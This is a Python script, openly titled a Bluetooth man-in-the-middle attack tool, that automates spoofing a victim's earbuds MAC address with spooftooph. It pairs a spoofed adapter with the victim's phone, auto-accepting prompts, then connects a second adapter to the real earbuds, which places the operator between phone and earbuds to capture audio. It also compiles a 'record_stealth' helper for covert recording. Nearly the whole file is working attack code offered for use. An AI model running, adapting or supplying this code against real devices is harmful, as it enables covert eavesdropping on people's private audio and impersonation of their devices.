#!/usr/bin/env python3
"""
Automated Bluetooth MITM Attack Script
=====================================
This script automates the complete Bluetooth Man-in-the-Middle attack process
to capture audio from victim's earbuds by spoofing the earbuds' MAC address.

Usage: sudo python3 bluetooth_mitm_automation.py
"""

import subprocess
import json
import time
import signal
import sys
import os
import threading
from pathlib import Path


class BluetoothMITMAutomator:
    def __init__(self):
        self.config = self.load_config()
        self.original_spoofed = False
        self.record_process = None
        self.cleanup_performed = False
        
        # Set up signal handlers for cleanup
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Validate prerequisites
        self.validate_prerequisites()
        
    def load_config(self):
        """Load configuration from mitm_config.json"""
        try:
            with open('mitm_config.json', 'r') as f:
                config = json.load(f)
            print("[+] Configuration loaded successfully")
            return config
        except FileNotFoundError:
            print("[-] mitm_config.json not found!")
            sys.exit(1)
        except json.JSONDecodeError as e:
            print(f"[-] Error parsing mitm_config.json: {e}")
            sys.exit(1)
    
    def validate_prerequisites(self):
        """Check if required tools and binaries are available"""
        required_tools = ['bluetoothctl', 'spooftooph', 'gcc', 'pactl', 'parec']
        
        for tool in required_tools:
            if not self.command_exists(tool):
                print(f"[-] Required tool '{tool}' not found. Please install it first.")
                sys.exit(1)
        
        # Check if record_stealth binary exists, compile if needed
        if not os.path.exists('record_stealth'):
            print("[*] Compiling record_stealth.c...")
            result = subprocess.run(['gcc', '-o', 'record_stealth', 'record_stealth.c'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[-] Failed to compile record_stealth.c: {result.stderr}")
                sys.exit(1)
            print("[+] record_stealth compiled successfully")
        
        print("[+] All prerequisites validated")
    
    def command_exists(self, command):
        """Check if a command exists in the system"""
        return subprocess.run(['which', command], capture_output=True).returncode == 0
    
    def run_command(self, command, capture_output=True, text=True, timeout=30):
        """Run a shell command with error handling"""
        try:
            result = subprocess.run(command, shell=True, capture_output=capture_output, 
                                  text=text, timeout=timeout)
            return result
        except subprocess.TimeoutExpired:
            print(f"[-] Command timed out: {command}")
            return None
        except Exception as e:
            print(f"[-] Error running command '{command}': {e}")
            return None
    
    def get_hci_interfaces(self):
        """Get available HCI interfaces and their MAC addresses using hciconfig -a"""
        result = self.run_command("hciconfig -a")
        if not result or result.returncode != 0:
            print("[-] Failed to get HCI interfaces")
            return {}
        
        interfaces = {}
        lines = result.stdout.split('\n')
        current_hci = None
        
        for line in lines:
            # Look for hci interface lines like "hci0:" or "hci1:"
            if line.strip().startswith('hci') and ':' in line:
                current_hci = line.split(':')[0].strip()
            # Look for BD Address lines
            elif 'BD Address:' in line and current_hci:
                parts = line.split('BD Address:')
                if len(parts) > 1:
                    mac = parts[1].split()[0].strip()
                    interfaces[mac] = current_hci
        
        return interfaces
    
    def get_spoofing_hci_interface(self):
        """Determine which HCI interface to use for spoofing automatically"""
        interfaces = self.get_hci_interfaces()
        original_mac = self.config['original_spoof_adapter_mac']
        
        if original_mac in interfaces:
            print(f"[+] Found spoofing adapter: {interfaces[original_mac]} ({original_mac})")
            return interfaces[original_mac]
        
        # If original MAC not found, show available and exit
        print(f"[-] Original adapter MAC {original_mac} not found")
        print("[*] Available interfaces:")
        for mac, hci in interfaces.items():
            print(f"    {hci}: {mac}")
        print("[-] Please update mitm_config.json with correct original_spoof_adapter_mac")
        sys.exit(1)
    
    def get_connecting_hci_interface(self):
        """Determine which HCI interface to use for connecting to real earbuds automatically"""
        interfaces = self.get_hci_interfaces()
        connecting_mac = self.config['connecting_adapter_mac']
        
        if connecting_mac in interfaces:
            print(f"[+] Found connecting adapter: {interfaces[connecting_mac]} ({connecting_mac})")
            return interfaces[connecting_mac]
        
        # If connecting MAC not found, show available and exit
        print(f"[-] Connecting adapter MAC {connecting_mac} not found")
        print("[*] Available interfaces:")
        for mac, hci in interfaces.items():
            print(f"    {hci}: {mac}")
        print("[-] Please update mitm_config.json with correct connecting_adapter_mac")
        sys.exit(1)
    
    def spoof_mac_address(self):
        """Step 1: Spoof the bluetooth adapter's MAC to victim earbuds MAC"""
        print("\n" + "="*60)
        print("[STEP 1] Spoofing MAC address to victim earbuds")
        print("="*60)
        
        victim_earbud_mac = self.config['victim_earbuds_mac']
        spoofing_hci = self.get_spoofing_hci_interface()
        
        print(f"[*] Spoofing {spoofing_hci} to MAC: {victim_earbud_mac}")
        
        # Run spooftooph command
        result = self.run_command(f"sudo spooftooph -i {spoofing_hci} -a {victim_earbud_mac}")
        
        if result and ("Address changed" in result.stdout or "No such device" in result.stderr):
            print(f"[+] MAC address spoofed successfully to {victim_earbud_mac}")
            self.original_spoofed = True
            
            # Set device alias
            alias = self.config.get('fake_earbuds_name', 'Spoofed Earbuds')
            self.set_device_alias(victim_earbud_mac, alias)
            
            return True
        else:
            print(f"[-] Failed to spoof MAC address: {result.stderr if result else 'Unknown error'}")
            return False
    
    def set_device_alias(self, mac, alias):
        """Set device alias using bluetoothctl"""
        print(f"[*] Setting device alias to '{alias}'")
        
        bluetoothctl_commands = f"""
select {mac}
system-alias {alias}
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(bluetoothctl_commands)
        
        if "system-alias" in stdout.lower() or process.returncode == 0:
            print(f"[+] Device alias set to '{alias}'")
        else:
            print(f"[-] Failed to set device alias: {stderr}")
    
    def setup_spoofed_adapter(self):
        """Steps 2-3: Select spoofed adapter and make it discoverable/pairable"""
        print("\n" + "="*60)
        print("[STEP 2-3] Setting up spoofed adapter")
        print("="*60)
        
        victim_earbud_mac = self.config['victim_earbuds_mac']
        
        bluetoothctl_commands = f"""
list
select {victim_earbud_mac}
pairable on
discoverable on
power on
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(bluetoothctl_commands)
        
        print(f"[*] Spoofed adapter setup output:\n{stdout}")
        
        if "pairable on" in stdout and "discoverable on" in stdout:
            print("[+] Spoofed adapter is now pairable and discoverable")
            return True
        else:
            print("[-] Failed to setup spoofed adapter")
            return False
    
    def pair_with_victim_phone(self):
        """Step 4: Pair and connect spoofed adapter with victim's phone"""
        print("\n" + "="*60)
        print("[STEP 4] Pairing and connecting with victim's phone")
        print("="*60)
        
        victim_phone_mac = self.config['victim_phone_mac']
        victim_earbud_mac = self.config['victim_earbuds_mac']
        
        print(f"[*] Attempting to pair with victim phone: {victim_phone_mac}")
        print("[!] IMPORTANT: Accept any pairing prompts on the victim's phone!")
        
        # First, check if already paired and try to connect directly
        print("[*] Checking if phone is already paired...")
        
        bluetoothctl_commands = f"""select {victim_earbud_mac}
connect {victim_phone_mac}
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(bluetoothctl_commands)
        
        if "Connection successful" in stdout:
            print("[+] Already paired and connected successfully!")
            return True
        
        # If connection failed, try pairing process
        print("[*] Not connected, starting pairing process...")
        
        bluetoothctl_commands = f"""select {victim_earbud_mac}
scan on
"""
        
        # Start scanning and pairing
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Send scan command
        process.stdin.write(bluetoothctl_commands)
        process.stdin.flush()
        time.sleep(5)  # Reduced wait time for scan
        
        # Try to pair with the phone
        pair_command = f"pair {victim_phone_mac}\n"
        process.stdin.write(pair_command)
        process.stdin.flush()
        
        # Monitor output in real-time for faster detection
        success_found = False
        failure_found = False
        
        for attempt in range(20):  # Check for 20 seconds max
            time.sleep(1)
            
            # Try to read current output
            try:
                # Send a non-blocking read attempt
                process.stdin.write("yes\n")  # Auto-accept prompts
                process.stdin.flush()
                
                # Check if process ended (indicating completion)
                if process.poll() is not None:
                    break
                    
            except:
                break
        
        # Try to connect after pairing
        connect_command = f"connect {victim_phone_mac}\n"
        process.stdin.write(connect_command)
        process.stdin.flush()
        time.sleep(5)  # Reduced wait time
        
        process.stdin.write("exit\n")
        stdout, stderr = process.communicate(timeout=10)
        
        print(f"[*] Pairing and connection output:\n{stdout}")
        
        # Check for various success indicators
        success_indicators = [
            "Connection successful",
            "Already connected", 
            "Pairing successful",
            "Connected: yes"
        ]
        
        failed_indicators = [
            "Failed to pair",
            "Failed to connect",
            "Connection failed",
            "org.bluez.Error"
        ]
        
        output_lower = stdout.lower()
        
        # Check for success
        for indicator in success_indicators:
            if indicator.lower() in output_lower:
                print(f"[+] Successfully paired and connected with victim's phone!")
                return True
        
        # Check for specific failures
        for indicator in failed_indicators:
            if indicator.lower() in output_lower and "alreadyexists" not in output_lower:
                print(f"[-] Pairing/connection failed: {indicator}")
                return False
        
        # Handle "Already exists" case - try connection again
        if "alreadyexists" in output_lower or "already exists" in output_lower:
            print("[*] Device already paired, attempting connection...")
            
            # Try direct connection
            connect_process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            connect_commands = f"""select {victim_earbud_mac}
connect {victim_phone_mac}
exit
"""
            connect_stdout, connect_stderr = connect_process.communicate(connect_commands)
            
            if "Connection successful" in connect_stdout or "Already connected" in connect_stdout:
                print("[+] Successfully connected to already paired phone!")
                return True
            else:
                print("[-] Failed to connect to already paired phone")
                print(f"Connection output: {connect_stdout}")
                return False
        
        print("[-] Pairing/connection status unclear - check victim's phone for requests")
        return False
    
    def setup_connecting_adapter(self):
        """Steps 5-6: Setup the second adapter for connecting to real earbuds"""
        print("\n" + "="*60)
        print("[STEP 5-6] Setting up connecting adapter")
        print("="*60)
        
        connecting_mac = self.config['connecting_adapter_mac']
        
        bluetoothctl_commands = f"""
list
select {connecting_mac}
pairable on
discoverable on
power on
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(bluetoothctl_commands)
        
        print(f"[*] Connecting adapter setup output:\n{stdout}")
        
        if "pairable on" in stdout and "discoverable on" in stdout:
            print("[+] Connecting adapter is now ready")
            return True
        else:
            print("[-] Failed to setup connecting adapter")
            return False
    
    def connect_to_real_earbuds(self):
        """Step 7: Connect to the real victim earbuds"""
        print("\n" + "="*60)
        print("[STEP 7] Connecting to real victim earbuds")
        print("="*60)
        
        victim_earbud_mac = self.config['victim_earbuds_mac']
        connecting_mac = self.config['connecting_adapter_mac']
        
        print(f"[*] Connecting to real earbuds: {victim_earbud_mac}")
        print("[!] Make sure the real earbuds are in pairing mode!")
        
        # First try direct connection if already paired
        print("[*] Checking if earbuds are already paired...")
        
        bluetoothctl_commands = f"""select {connecting_mac}
connect {victim_earbud_mac}
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(bluetoothctl_commands)
        
        if "Connection successful" in stdout:
            print("[+] Already paired and connected to earbuds successfully!")
            return True
        
        # If not connected, start pairing process
        print("[*] Not connected, starting pairing and connection process...")
        
        bluetoothctl_commands = f"""select {connecting_mac}
scan on
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Start scanning
        process.stdin.write(bluetoothctl_commands)
        process.stdin.flush()
        time.sleep(5)  # Reduced scan time
        
        # Try to pair with earbuds
        pair_command = f"pair {victim_earbud_mac}\n"
        process.stdin.write(pair_command)
        process.stdin.flush()
        time.sleep(8)  # Reduced pairing wait time
        
        # Accept pairing
        process.stdin.write("yes\n")
        process.stdin.flush()
        time.sleep(3)
        
        # Try to connect with frequent status monitoring
        connect_command = f"connect {victim_earbud_mac}\n"
        process.stdin.write(connect_command)
        process.stdin.flush()
        
        # Monitor connection with frequent checks - exit immediately on success
        for check_attempt in range(10):  # Check every second for 10 seconds
            time.sleep(1)
            
            # Send a status command to force output
            try:
                process.stdin.write("\n")  # Just send newline to get current status
                process.stdin.flush()
                
                # Check if we need to handle authorization
                if check_attempt == 2 or check_attempt == 4:  # Only at specific intervals
                    process.stdin.write("yes\n")
                    process.stdin.flush()
                
                # Quick exit check by sending exit and reading output
                process.stdin.write("exit\n")
                process.stdin.flush()
                
                try:
                    stdout, stderr = process.communicate(timeout=3)
                    
                    # Immediate success check
                    if ("Connection successful" in stdout or 
                        "Already connected" in stdout or 
                        "Connected: yes" in stdout or
                        "[Noise Buds N1 Pro]>" in stdout):
                        print(f"[+] Connection success detected at check {check_attempt + 1}!")
                        print("[+] Successfully connected to real earbuds!")
                        return True
                        
                    # Check for definitive failures
                    if any(fail in stdout for fail in ["Failed to connect", "Connection failed", "No such device", "org.bluez.Error"]):
                        print("[-] Connection failed - detected during monitoring")
                        break
                        
                except subprocess.TimeoutExpired:
                    # Process still running, continue monitoring
                    pass
                    
                # Restart process for next check if it exited
                if process.poll() is not None:
                    process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    process.stdin.write(f"select {connecting_mac}\n")
                    process.stdin.flush()
                    time.sleep(0.5)
                    
            except Exception as e:
                print(f"[*] Check attempt {check_attempt + 1} had issue: {e}")
                continue
        
        # Final comprehensive check
        print("[-] Quick checks completed, doing final verification...")
        try:
            process.stdin.write("exit\n")
            stdout, stderr = process.communicate(timeout=5)
        except:
            stdout = ""
        
        # Check for success indicators FIRST (final status takes precedence)
        success_indicators = [
            "Connection successful",
            "Already connected", 
            "Connected: yes"
        ]
        
        # Check for critical failure indicators (only these should fail immediately)
        critical_failure_indicators = [
            "Failed to connect",
            "Connection failed", 
            "Failed to pair",
            "No such device",
            "org.bluez.Error"
        ]
        
        # Check for authentication failures (separate handling)
        auth_failure_indicators = [
            "auth failed",
            "authentication failed"
        ]
        
        output_lower = stdout.lower()
        
        # First check for SUCCESS (most important - final connection status)
        for indicator in success_indicators:
            if indicator.lower() in output_lower:
                print("[+] Successfully connected to real earbuds!")
                # Double-check: also look for prompt change indicating successful connection
                if "[noise buds n1 pro]>" in output_lower or f"[{self.config.get('fake_earbuds_name', 'Noise Buds N1 Pro').lower()}]>" in output_lower:
                    print("[+] Confirmed: Bluetooth prompt shows earbuds name - connection verified!")
                return True
        
        # Then check for critical failures (these override temporary disconnections)
        for indicator in critical_failure_indicators:
            if indicator.lower() in output_lower:
                print(f"[-] Connection failed: Found '{indicator}' in output")
                print("[!] Common causes:")
                print("    - Earbuds not in pairing mode")
                print("    - Earbuds already paired to another device")
                print("    - Critical Bluetooth communication issues")
                print("    - Distance or interference problems")
                return False
        
        # Check for authentication failures specifically (these need retry logic)
        for indicator in auth_failure_indicators:
            if indicator.lower() in output_lower:
                print(f"[-] Authentication failed: Found '{indicator}' in output")
                print("[*] Authentication failed - attempting to clear existing pairing and retry...")
                self.clear_earbuds_pairing()
                time.sleep(2)
                
                # Retry connection once after clearing
                print("[*] Retrying connection after clearing pairing...")
                retry_process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                retry_commands = f"""select {connecting_mac}
scan on
"""
                retry_process.stdin.write(retry_commands)
                retry_process.stdin.flush()
                time.sleep(5)
                
                # Try pairing again
                retry_process.stdin.write(f"pair {victim_earbud_mac}\n")
                retry_process.stdin.flush()
                time.sleep(10)
                
                retry_process.stdin.write("yes\n")
                retry_process.stdin.flush()
                time.sleep(5)
                
                # Try connecting again
                retry_process.stdin.write(f"connect {victim_earbud_mac}\n")
                retry_process.stdin.flush()
                time.sleep(8)
                
                # Handle service authorization prompts
                for i in range(3):
                    retry_process.stdin.write("yes\n")
                    retry_process.stdin.flush()
                    time.sleep(2)
                
                retry_process.stdin.write("exit\n")
                retry_stdout, retry_stderr = retry_process.communicate()
                
                print(f"[*] Retry attempt output:\n{retry_stdout}")
                
                # Check if retry succeeded
                retry_lower = retry_stdout.lower()
                for success_indicator in success_indicators:
                    if success_indicator.lower() in retry_lower:
                        print("[+] Retry successful! Connected to earbuds after clearing pairing")
                        return True
                
                # Check if retry also failed
                for fail_indicator in critical_failure_indicators:
                    if fail_indicator.lower() in retry_lower:
                        print(f"[-] Retry also failed: {fail_indicator}")
                        break
                
                print("[-] Retry attempt also failed")
                return False
        
        # Then check for success
        for indicator in success_indicators:
            if indicator.lower() in output_lower:
                print("[+] Successfully connected to real earbuds!")
                return True
        # Handle already exists case
        if "alreadyexists" in output_lower or "already exists" in output_lower:
            print("[*] Earbuds already paired, attempting direct connection...")
            
            # Try direct connection
            connect_process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            connect_commands = f"""select {connecting_mac}
connect {victim_earbud_mac}
exit
"""
            connect_stdout, connect_stderr = connect_process.communicate(connect_commands)
            
            print(f"[*] Direct connection attempt output:\n{connect_stdout}")
            
            # Check for success first
            if ("Connection successful" in connect_stdout or "Already connected" in connect_stdout or 
                "[noise buds n1 pro]>" in connect_stdout.lower()):
                print("[+] Successfully connected to already paired earbuds!")
                return True
            
            # Check for failures in direct connection too
            connect_lower = connect_stdout.lower()
            for indicator in critical_failure_indicators:
                if indicator.lower() in connect_lower:
                    print(f"[-] Direct connection also failed: Found '{indicator}'")
                    return False
            
            print("[-] Failed to connect to already paired earbuds")
            print(f"[*] Connection output: {connect_stdout}")
            return False
        
        # If we reach here, check if there's any sign of successful connection
        # Sometimes the success indicators might be missed in parsing
        if ("[noise buds n1 pro]>" in output_lower or 
            "pairing successful" in output_lower or
            "bonded: yes" in output_lower):
            print("[+] Connection appears successful based on pairing status and prompt change")
            return True
        
        print("[-] Connection status unclear - earbuds may not be in pairing mode or authentication failed")
        print("[!] Please check:")
        print("    - Earbuds are in pairing mode (usually hold button for 3-5 seconds)")
        print("    - Earbuds are not connected to another device")
        print("    - Clear any existing pairings on the earbuds")
        print("    - Note: Temporary disconnections during pairing are normal")
        return False
    
    def verify_earbuds_connection(self):
        """Verify that earbuds are actually connected"""
        print("\n[*] Verifying earbuds connection...")
        
        victim_earbud_mac = self.config['victim_earbuds_mac']
        connecting_mac = self.config['connecting_adapter_mac']
        
        # Check connection status using bluetoothctl
        check_commands = f"""select {connecting_mac}
info {victim_earbud_mac}
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(check_commands)
        
        print(f"[*] Connection verification output:\n{stdout}")
        
        # Check for connection indicators
        if "Connected: yes" in stdout:
            print("[+] Earbuds connection verified - device is connected!")
            return True
        elif "Connected: no" in stdout:
            print("[-] Earbuds connection verification failed - device shows as not connected")
            return False
        else:
            # Try alternative verification with list of connected devices
            list_commands = f"""select {connecting_mac}
devices
exit
"""
            
            list_process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            list_stdout, list_stderr = list_process.communicate(list_commands)
            
            if victim_earbud_mac in list_stdout and "Noise Buds N1 Pro" in list_stdout:
                print("[+] Earbuds found in device list - connection appears successful")
                return True
            else:
                print("[-] Earbuds not found in connected device list")
                return False
    
    def clear_earbuds_pairing(self):
        """Clear existing earbuds pairing to resolve authentication issues"""
        print("\n[*] Clearing existing earbuds pairing...")
        
        victim_earbud_mac = self.config['victim_earbuds_mac']
        connecting_mac = self.config['connecting_adapter_mac']
        
        clear_commands = f"""select {connecting_mac}
remove {victim_earbud_mac}
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(clear_commands)
        
        if "Device has been removed" in stdout or "not available" in stdout:
            print("[+] Existing earbuds pairing cleared")
            return True
        else:
            print("[*] No existing pairing found or already cleared")
            return True  # Not an error if no pairing existed    
    
    def cleanup_bluetooth_connections(self):
        """Cleanup bluetooth connections and settings"""
        print("\n[*] Cleaning up bluetooth connections...")
        
        victim_phone_mac = self.config['victim_phone_mac']
        victim_earbud_mac = self.config['victim_earbuds_mac']
        connecting_mac = self.config['connecting_adapter_mac']
        
        # Cleanup spoofed adapter connections
        cleanup_commands = f"""
select {victim_earbud_mac}
disconnect {victim_phone_mac}
remove {victim_phone_mac}
discoverable off
pairable off
exit
"""
        
        process = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(cleanup_commands)
        
        # Cleanup connecting adapter
        cleanup_commands2 = f"""
select {connecting_mac}
disconnect {victim_earbud_mac}
remove {victim_earbud_mac}
discoverable off
pairable off
exit
"""
        
        process2 = subprocess.Popen(['bluetoothctl'], stdin=subprocess.PIPE, 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout2, stderr2 = process2.communicate(cleanup_commands2)
        
        print("[+] Bluetooth connections cleaned up")
    
    def reset_spoofed_adapter(self):
        """Reset the spoofed adapter to its original MAC and name"""
        if not self.original_spoofed:
            return
            
        print("\n[*] Resetting spoofed adapter to original MAC...")
        
        original_mac = self.config['original_spoof_adapter_mac']
        original_name = self.config.get('original_adapter_name', 'Original Adapter')
        
        # Get the current spoofed MAC to find the right interface
        victim_earbud_mac = self.config['victim_earbuds_mac']
        interfaces = self.get_hci_interfaces()
        
        spoofing_hci = None
        
        # Look for the spoofed MAC (victim earbud MAC) in current interfaces
        if victim_earbud_mac in interfaces:
            spoofing_hci = interfaces[victim_earbud_mac]
        else:
            # Fallback: try to find by original MAC
            for mac, hci in interfaces.items():
                if mac == original_mac:
                    spoofing_hci = hci
                    break
            
            # Last resort: try hci1 (common spoofing interface)
            if not spoofing_hci:
                spoofing_hci = "hci1"
        
        print(f"[*] Using interface {spoofing_hci} to reset MAC to {original_mac}")
        
        # Reset MAC address
        result = self.run_command(f"sudo spooftooph -i {spoofing_hci} -a {original_mac}")
        
        if result and ("Address changed" in result.stdout or "No such device" in result.stderr):
            print(f"[+] MAC address reset to original: {original_mac}")
            
            # Reset device alias
            time.sleep(2)  # Wait a moment for the change to take effect
            self.set_device_alias(original_mac, original_name)
            
            print("[+] Adapter reset completed")
        else:
            print(f"[-] Failed to reset MAC address: {result.stderr if result else 'Unknown error'}")
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C and cleanup"""
        if self.cleanup_performed:
            return
            
        print(f"\n[!] Received signal {signum}, performing cleanup...")
        self.cleanup_performed = True
        
        # Stop recording process
        if self.record_process and self.record_process.poll() is None:
            print("[*] Stopping recording process...")
            self.record_process.terminate()
            try:
                self.record_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                print("[*] Force killing recording process...")
                self.record_process.kill()
        
        # Cleanup bluetooth connections
        self.cleanup_bluetooth_connections()
        
        # Reset spoofed adapter
        self.reset_spoofed_adapter()
        
        print("[+] Cleanup completed successfully!")
        
        # Only exit if this was called by a real signal (not programmatically)
        if signum in (signal.SIGINT, signal.SIGTERM):
            sys.exit(0)
    
    def run_attack(self):
        """Execute the complete MITM attack sequence"""
        try:
            print("="*80)
            print("🎯 BLUETOOTH MITM ATTACK AUTOMATION STARTED")
            print("="*80)
            print(f"Target Earbuds: {self.config['victim_earbuds_mac']}")
            print(f"Target Phone: {self.config['victim_phone_mac']}")
            print(f"Recording File: {self.config.get('recording_file', 'captured_audio.wav')}")
            print("="*80)
            
            # Step 1: Spoof MAC address
            if not self.spoof_mac_address():
                print("[-] CRITICAL: MAC spoofing failed. Cannot continue.")
                return False
            
            time.sleep(2)
            
            # Step 2-3: Setup spoofed adapter
            if not self.setup_spoofed_adapter():
                print("[-] CRITICAL: Spoofed adapter setup failed. Cannot continue.")
                return False
            
            time.sleep(2)
            
            # Step 4: Pair with victim phone
            if not self.pair_with_victim_phone():
                print("[-] CRITICAL: Phone pairing/connection failed. Cannot continue.")
                print("[!] Please check:")
                print("    - Victim's phone is within range")
                print("    - Victim accepts pairing requests")
                print("    - No interference with Bluetooth signals")
                return False
            
            time.sleep(3)
            
            # Step 5-6: Setup connecting adapter
            if not self.setup_connecting_adapter():
                print("[-] CRITICAL: Connecting adapter setup failed. Cannot continue.")
                return False
            
            time.sleep(2)
            
            # Step 7: Connect to real earbuds
            if not self.connect_to_real_earbuds():
                print("[-] CRITICAL: Earbuds connection failed. Cannot continue.")
                print("[!] Please check:")
                print("    - Real earbuds are in pairing mode")
                print("    - Earbuds are within range") 
                print("    - No interference with Bluetooth signals")
                print("    - Clear existing pairings on earbuds if needed")
                return False
            
            # Verify earbuds are actually connected before proceeding
            if not self.verify_earbuds_connection():
                print("[-] CRITICAL: Earbuds connection verification failed. Cannot continue.")
                return False
            
            time.sleep(3)
            
            print("[+] All steps completed successfully!")
            print("[+] MITM attack is now active and running")
            print("[+] You are positioned between the phone and earbuds")
            print("[*] Press Ctrl+C to stop the attack and cleanup...")
            
            # Just wait for Ctrl+C 
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Attack stopped by user")
            
            return True
            
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Unexpected error during attack: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # Perform cleanup manually instead of calling signal handler
            if not self.cleanup_performed:
                print("\n[*] Performing final cleanup...")
                self.cleanup_performed = True
                
                # Cleanup bluetooth connections
                self.cleanup_bluetooth_connections()
                
                # Reset spoofed adapter
                self.reset_spoofed_adapter()
                
                print("[+] Final cleanup completed successfully!")


def main():
    """Main function"""
    if os.geteuid() != 0:
        print("[-] This script must be run as root (sudo)")
        print("    Usage: sudo python3 bluetooth_mitm_automation.py")
        sys.exit(1)
    
    automator = BluetoothMITMAutomator()
    automator.run_attack()


if __name__ == "__main__":
    main()
